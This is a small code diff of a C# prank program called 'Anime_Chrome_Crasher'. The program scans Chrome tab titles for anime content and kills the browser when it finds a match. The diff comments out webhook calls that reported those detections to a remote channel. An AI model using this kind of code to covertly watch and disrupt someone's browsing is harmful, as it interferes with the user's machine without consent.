@@ -10,7 +10,7 @@ namespace Anime_Chrome_Crasher
         [STAThread]
         static void Main()
         {
-            WeebHook.SendMessage("Weeb detection started");
+            //WeebHook.SendMessage("Weeb detection started");
             FindWindows.Start();
             while (true)
             {
@@ -19,7 +19,7 @@ namespace Anime_Chrome_Crasher
                     if (FindWindows.CheckTabs())
                     {
                         FindWindows.killWindow("chrome");
-                        WeebHook.SendMessage("WARNING WEEB DETECTED");
+                        //WeebHook.SendMessage("WARNING WEEB DETECTED");
                     }
                 }
             }
